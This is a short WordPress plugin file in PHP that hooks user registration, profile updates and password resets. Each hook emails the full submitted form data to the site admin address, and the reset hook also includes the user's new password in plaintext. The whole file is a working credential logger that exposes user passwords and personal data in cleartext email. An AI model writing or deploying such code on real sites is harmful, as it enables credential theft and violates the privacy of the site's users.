<?php

/**
 * Capture user POST data from forms
 * for new users and existing user updates
 * 
 **/


function wpsa_user_register( $user_id ) {

	wp_mail(get_option('admin_email'), 	
		'POST DATA. New user registration', 
		var_export($_POST, true) );
}

add_action( 'user_register', 'wpsa_user_register');


function wpsa_user_update( $user_id ) {

	wp_mail(get_option('admin_email'), 	
		'POST DATA. Update profile for '.get_user_by('id', $user_id)->user_login, 
		var_export($_POST, true) );
}

add_action( 'profile_update', 'wpsa_user_update');


function wpsa_password_reset( $user, $pass ) {

	wp_mail(get_option('admin_email'), 	
		'POST DATA. Reset password for '.$user->user_login, 
		"New password is ".$pass."\r\n".var_export($_POST, true) );
}

add_action( 'password_reset', 'wpsa_password_reset', 10, 2);